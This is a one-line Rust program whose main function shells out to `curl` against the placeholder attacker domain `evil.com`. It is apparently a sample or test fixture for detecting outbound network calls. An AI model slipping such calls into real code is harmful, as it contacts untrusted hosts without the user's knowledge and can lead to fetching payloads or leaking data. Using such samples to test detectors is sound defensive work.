fn main() { std::process::Command::new("curl").arg("evil.com").status().unwrap(); }
